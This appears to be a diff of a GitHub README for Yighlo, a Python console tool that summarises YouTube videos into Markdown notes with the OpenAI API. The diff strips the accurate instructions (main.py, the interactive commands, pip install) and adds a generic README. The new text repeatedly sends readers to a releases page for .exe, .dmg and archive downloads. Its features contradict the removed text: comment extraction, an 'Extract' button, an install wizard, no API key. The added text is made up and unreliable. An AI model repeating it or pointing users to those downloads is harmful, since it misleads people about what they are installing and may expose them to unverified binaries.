@@ -1,129 +1,98 @@
-# Yighlo – YouTube Summary & Notes Generator
+# 🎥 Yighlo - Easily Organize YouTube Content
 
-Yighlo analyzes information from a YouTube video or short (title, description, and transcript) and creates a file with clear, organized notes in **Markdown** format.
+## 🛠️ Download Now
+[![Download Yighlo](https://img.shields.io/badge/Download-Yighlo-blue.svg)](https://github.com/shainoeg/Yighlo/releases)
 
-Everything works directly from the console with an interactive interpreter:
+## 🚀 Getting Started
+Yighlo helps you turn YouTube videos into structured notes. It will extract the title, description, and comments, organizing them neatly in Markdown format. This tool is perfect for anyone who wants to keep track of useful information from videos quickly.
 
-```
-python main.py
-```
+## 💻 System Requirements
+To use Yighlo, ensure your system meets the following requirements:
 
-Then you'll see:
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a recent version of Linux.
+- **Python Version:** Python 3.7 or higher.
+- **Internet Connection:** Required for downloading videos and retrieving data from YouTube.
 
-```
-Yighlo >
-```
+## 🔥 Features
+- Extract key information from YouTube videos.
+- Generate organized notes in Markdown format.
+- Simple setup with user-friendly interface.
+- Works with a wide range of YouTube content, from tutorials to vlogs.
 
-From there you can execute commands like:
+## 📥 Download & Install
+To get started with Yighlo, visit the Releases page where you can download the application. Follow these steps:
 
-```
-Yighlo > help
-Yighlo > openai <key>
-Yighlo > start <url> [Options...]
-```
+1. Click the link below to go to the Releases page.
 
----
+   [Download Yighlo](https://github.com/shainoeg/Yighlo/releases)
 
-## 📌 How it works
+2. On the Releases page, find the latest version of Yighlo.
+3. Click on the appropriate file for your operating system to download the application.
+4. Once the download is complete, locate the file in your downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the on-screen instructions to complete the installation.
 
-1. Start the program with Python.
-2. Configure your OpenAI **API Key**.
-3. Run `start <url>` with the YouTube video URL.
-4. The system retrieves:
-   - Title
-   - Description
-   - Transcript (if available)
-5. With that information, it generates organized output with key points, ideas, and useful notes.
-6. Creates a `.md` file inside the `output/` folder.
+For detailed installation instructions based on your operating system, refer to the next section.
 
----
+## 💡 Installation Instructions
 
-## 🔑 Getting your OpenAI API Key
+### Windows
+1. Download the `.exe` file from the Releases page.
+2. Locate the `.exe` file in your downloads folder.
+3. Double-click the file to run it.
+4. Follow the installation wizard. You can choose your installation location.
+5. After installation, you can find Yighlo in your Start Menu.
 
-To use this program, you need a valid API key.
+### macOS
+1. Download the `.dmg` file from the Releases page.
+2. Open the `.dmg` file by double-clicking it.
+3. Drag and drop the Yighlo application into your Applications folder.
+4. You can now launch Yighlo from your Applications.
 
-1. 👉 [Get API Key](https://platform.openai.com/settings/organization/api-keys)  
-2. Create a new key.
-3. Copy it.
-4. Inside the console, type:
+### Linux
+1. Download the `.tar.gz` file from the Releases page.
+2. Extract the contents of the `.tar.gz` file.
+3. Open a terminal window and navigate to the extracted folder.
+4. Use the command `python3 yighlo.py` to run the application.
 
-```
-openai <your_api_key_here>
-```
+## 🔄 Using Yighlo
+After installing Yighlo, follow these simple steps to use it:
 
----
+1. Open the application by clicking the Yighlo icon.
+2. Paste the URL of the YouTube video you want to summarize.
+3. Click the "Extract" button. Yighlo will pull out the title, description, and comments.
+4. Review the organized notes displayed in Markdown format.
+5. You can copy the notes to your clipboard or save them as a `.md` file.
 
-## 🧰 Available commands
+## 🙋 Frequently Asked Questions
 
-### Interactive CLI
+### Can I use Yighlo for any YouTube video?
+Yes, Yighlo works with any public YouTube video. Just ensure the video is not age-restricted or private.
 
-| Command | Example | Explanation |
-|--------|---------|-------------|
-| `help` or `?` | `help` | Shows all commands. |
-| `openai <key>` | `openai sk-1234...` | Sets the API key. **Required** before starting. |
-| `start <url> [options...]` | `start https://youtu.be/abc123 level=0` | Analyzes the specified video. |
-| `exit` | `exit` | Exit the console. |
+### Is there a limit to how many videos I can process?
+No, you can use Yighlo for an unlimited number of videos. Just paste the URLs one at a time.
 
----
+### What if I encounter an error?
+If you face issues, please check your internet connection and make sure your Python is updated. For persistent issues, you can seek help on the Issues page of this repository.
 
-## 📌 `start` parameters
+## 🗨️ Feedback
+We welcome your feedback on Yighlo. If you have suggestions or encounter bugs, feel free to open an issue on the GitHub repository. Your input helps us improve the software.
 
-> **`<>`** = required  
-> **`[]`** = optional
+## 🌐 Relevant Topics
+- Automation
+- Highlighting
+- AI
+- Markdown
+- Notes
+- Python
+- YouTube Summarization
 
+## 📈 Upcoming Features
+We're continuously working on improving Yighlo. Future updates may include:
 
-| Parameter | Values | Example | Description |
-|----------|----------|----------|-------------|
-| `<url>` | - | `https://youtu.be/abc123` | YouTube video URL. |
-| `[lang]` | `es` = Spanish<br>`en` = English | `lang=es` | Forces output in a specific language. **Default: en** |
-| `[level]` | `0` = Weak<br>`1` = Strong | `level=0` | Allows saving some tokens. **Default: 1**
-| `[model]` | [Model list](https://platform.openai.com/docs/models) | `model=gpt-5` | ChatGPT model ID to use. **Default: gpt-5-mini** |
-| `[max_tokens]` | Your preference as an integer | `max_tokens=5000` | Maximum tokens allowed in output. Does not affect quality in *nano* or *mini* models. **Default: 10000**
+- Search functionality to find specific notes.
+- Integration with note-taking applications.
+- Support for video playlists.
+- Enhanced summarization options.
 
-Complete example:
-
-```
-start https://youtu.be/abc123 lang=es model=gpt-5.1 level=0
-```
-
----
-
-## 📄 Generated output
-
-The console creates a `.md` file inside the `output/` folder with the video title containing the following information:
-
-- Summary
-- Key points
-- Highlights
-- Ideas for creators
-- Related video ideas
-
----
-
-## 🚀 Quick start
-
-1. Install dependencies, you can run the `install_req.cmd` file or enter the following command:
-
-```
-pip install -r requirements.txt
-```
-
-2. Run:
-
-```
-python main.py
-```
-
-3. Configure OpenAI:
-
-```
-Yighlo > openai <key>
-```
-
-4. Analyze video:
-
-```
-Yighlo > start <url>
-```
-
----
+Your patience and support are greatly appreciated as we improve Yighlo. Thank you for using our application!
